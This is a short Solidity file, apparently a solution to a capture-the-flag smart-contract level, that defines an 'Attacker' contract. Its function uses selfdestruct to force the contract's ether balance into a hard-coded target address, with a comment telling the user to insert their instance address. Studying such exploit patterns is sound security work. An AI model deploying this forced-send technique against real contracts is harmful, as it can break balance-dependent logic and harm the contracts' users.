// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    //selfdestructing a contract sends its all balance to specified address being it a eoa or contract
    function attack() public payable {
        address payable addr = payable(address(0xe47e824C6fa81726B82e67039de3370271091708)); //put your instance address
        selfdestruct(addr);
    }
}